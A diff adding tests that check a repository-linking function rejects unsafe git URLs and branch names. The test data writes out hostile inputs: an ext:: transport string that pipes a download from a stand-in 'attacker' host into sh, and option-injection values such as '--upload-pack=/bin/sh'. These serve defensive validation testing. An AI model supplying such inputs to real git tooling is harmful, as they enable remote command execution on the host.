@@ -134,3 +134,31 @@ describe("chunkCode", () => {
     expect(chunks[0].endLine).toBe(2);
   });
 });
+
+describe("repo URL and branch validation", () => {
+  it("refuses git transports and option-shaped positionals", async () => {
+    for (const url of [
+      // git's ext:: transport is documented command execution.
+      "ext::sh -c 'curl attacker/x|sh'",
+      // A positional starting with `-` is read by git as an option.
+      "--upload-pack=/bin/sh",
+      "-u/bin/sh",
+      "not a url at all",
+    ])
+      await expect(linkRepo({ slug: "badrepo", url })).rejects.toThrow(
+        "is not a repository URL",
+      );
+  });
+
+  it("refuses a branch name git would read as an option", async () => {
+    // An empty branch is "not specified", and falls through to the column default.
+    for (const defaultBranch of ["--upload-pack=/bin/sh", "-x", "a..b", "x y"])
+      await expect(
+        linkRepo({
+          slug: "badbranch",
+          url: "https://example.invalid/r.git",
+          defaultBranch,
+        }),
+      ).rejects.toThrow(/not a valid branch name|not a repository URL/);
+  });
+});
